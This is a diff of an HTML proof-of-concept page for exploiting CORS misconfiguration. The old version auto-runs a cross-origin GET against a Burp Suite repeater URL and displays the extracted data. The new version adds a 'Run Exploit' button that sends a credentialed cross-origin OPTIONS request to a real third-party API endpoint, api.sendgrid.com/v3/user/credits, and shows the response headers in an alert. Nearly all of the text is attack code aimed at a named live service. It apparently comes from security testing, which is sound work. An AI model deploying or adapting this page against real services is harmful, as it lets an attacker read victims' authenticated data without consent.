@@ -2,48 +2,58 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS Exploitation PoC</title>
+    <title>CORS OPTIONS Exploit PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #f9f9f9; }
+        .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
+        h1 { color: #333; font-size: 20px; }
+        #target-url { font-weight: bold; color: blue; }
+        button { background-color: #d9534f; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background-color: #c9302c; }
+    </style>
 </head>
 <body>
-    <h1>CORS Vulnerability - Proof of Concept</h1>
-    <p>Targeting: <code id="target-url">http://burpsuite/repeat/3/7q6beeosymtzj3bjo0osy683vw3a2zjl</code></p>
+
+<div class="container">
+    <h1>CORS Vulnerability PoC - OPTIONS Method</h1>
+    <p>Targeting URL: <span id="target-url"></span></p>
     
-    <div id="result" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">
-        Waiting for response...
-    </div>
+    <p>This PoC will send a cross-origin <strong>OPTIONS</strong> request with credentials. If successful and misconfigured, the response will be alert.</p>
+    
+    <button onclick="sendOptionsRequest()">Run Exploit</button>
+</div>
 
-    <script>
-        const target = "http://burpsuite/repeat/3/7q6beeosymtzj3bjo0osy683vw3a2zjl";
-        document.getElementById('target-url').innerText = target;
+<script>
+    const targetUrl = "https://api.sendgrid.com/v3/user/credits"; 
 
-        function exploit() {
-            var xhr = new XMLHttpRequest();
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == XMLHttpRequest.DONE) {
-                    if (xhr.status == 200) {
-                        document.getElementById('result').innerHTML = 
-                            "<h3>Success! Data Extracted:</h3><pre>" + 
-                            escapeHtml(xhr.responseText) + "</pre>";
-                    } else {
-                        document.getElementById('result').innerHTML = 
-                            "<h3 style='color:red;'>Failed! Status: " + xhr.status + "</h3>";
-                    }
+    document.getElementById('target-url').innerText = targetUrl;
+
+    function sendOptionsRequest() {
+        var xhr = new XMLHttpRequest();
+        
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == XMLHttpRequest.DONE) {
+                if (xhr.status == 200 || xhr.status == 204) {
+                    var responseHeaders = xhr.getAllResponseHeaders();
+                    var msg = "SUCCESS! OPTIONS request was allowed.\n\n";
+                    msg += "Response Status: " + xhr.status + "\n\n";
+                    msg += "Response Headers:\n" + responseHeaders;
+                    
+                    alert(msg);
+                } else {
+                    alert("FAILED! Status: " + xhr.status + "\nCORS policy likely blocked the response or the server doesn't accept OPTIONS.");
                 }
-            };
+            }
+        };
 
-            xhr.open("GET", target, true);
-           // xhr.withCredentials = true; 
-            xhr.send();
-        }
+        xhr.open("OPTIONS", targetUrl, true);
+        
+        xhr.withCredentials = true; 
+        
 
-        function escapeHtml(text) {
-            var div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
+        xhr.send();
+    }
+</script>
 
-        window.onload = exploit;
-    </script>
 </body>
 </html>
